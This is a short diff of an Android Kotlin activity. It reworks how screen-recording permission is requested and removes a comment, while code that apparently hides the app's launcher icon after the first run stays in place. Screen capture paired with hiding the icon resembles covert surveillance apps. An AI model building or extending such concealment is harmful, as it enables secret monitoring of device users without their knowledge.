@@ -162,11 +162,7 @@ class MainActivity : AppCompatActivity() {
     private fun requestScreenRecording() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-            startIntentSenderForResult(
-                projectionManager.createScreenCaptureIntent().intentSender,
-                screenRecordRequestCode,
-                null, 0, 0, 0
-            )
+            startActivityForResult(projectionManager.createScreenCaptureIntent(), screenRecordRequestCode)
         }
     }
 
@@ -185,7 +181,6 @@ class MainActivity : AppCompatActivity() {
 
     override fun onDestroy() {
         super.onDestroy()
-        // Hide launcher icon after first close
         if (!isFirstRun) {
             packageManager.setComponentEnabledSetting(
                 componentName,
